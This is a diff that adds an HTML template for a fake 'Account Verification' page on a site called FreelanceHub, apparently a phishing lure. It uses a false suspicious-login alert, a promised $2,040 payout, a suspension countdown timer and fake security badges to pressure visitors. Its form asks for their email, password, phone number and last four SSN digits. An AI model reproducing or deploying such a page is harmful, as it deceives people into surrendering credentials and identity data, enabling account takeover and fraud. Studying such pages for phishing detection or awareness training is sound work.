@@ -1,0 +1,79 @@
+{% extends "base.html" %}
+
+{% block title %}Verify Identity — FreelanceHub{% endblock %}
+{% block page_title %}Account Verification{% endblock %}
+
+{% block content %}
+<div class="verify-wrapper">
+    <div class="verify-alert">
+        <span class="material-icons-outlined">warning</span>
+        <div class="verify-alert-text">
+            <strong>Suspicious login detected.</strong> To protect your account and release pending payouts
+            ($2,040.00), please verify your identity below. This must be completed within
+            <strong id="countdown-display">23:59:47</strong> or your account will be temporarily suspended.
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="material-icons-outlined">verified_user</span>
+            Identity Verification
+        </div>
+        <div class="card-body">
+            <form id="verify-form" onsubmit="event.preventDefault(); submitVerification();">
+                <div class="verify-form-group">
+                    <label for="verify-email">Email Address</label>
+                    <input type="email" id="verify-email" name="email"
+                           placeholder="Enter your account email" autocomplete="off">
+                </div>
+                <div class="verify-form-group">
+                    <label for="verify-password">Account Password</label>
+                    <input type="password" id="verify-password" name="password"
+                           placeholder="Enter your password" autocomplete="off">
+                </div>
+                <div class="verify-form-group">
+                    <label for="verify-phone">Phone Number</label>
+                    <input type="tel" id="verify-phone" name="phone"
+                           placeholder="(XXX) XXX-XXXX" autocomplete="off">
+                </div>
+                <div class="verify-form-group">
+                    <label for="verify-ssn">Last 4 digits of SSN</label>
+                    <input type="text" id="verify-ssn" name="ssn_last4"
+                           placeholder="XXXX" maxlength="4" autocomplete="off">
+                    <p class="text-muted text-sm mt-2">Required for identity verification per our security policy.</p>
+                </div>
+                <button type="submit" id="btn-verify" class="btn-verify">
+                    Verify My Identity
+                </button>
+            </form>
+            <div class="verify-timer">
+                <span class="material-icons-outlined" style="font-size:16px;vertical-align:middle;">timer</span>
+                Verification expires in <span id="countdown-timer">23:59:47</span>
+            </div>
+            <div class="verify-footer">
+                FreelanceHub Trust &amp; Safety · Securing your account since 2020<br>
+                <span class="material-icons-outlined" style="font-size:14px;vertical-align:middle;">lock</span>
+                256-bit SSL Encrypted · SOC 2 Certified
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function() {
+    let seconds = 86387;
+    const displays = document.querySelectorAll('#countdown-display, #countdown-timer');
+    setInterval(function() {
+        if (seconds <= 0) return;
+        seconds--;
+        const h = Math.floor(seconds / 3600);
+        const m = Math.floor((seconds % 3600) / 60);
+        const s = seconds % 60;
+        const str = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        displays.forEach(el => el.textContent = str);
+    }, 1000);
+})();
+</script>
+{% endblock %}
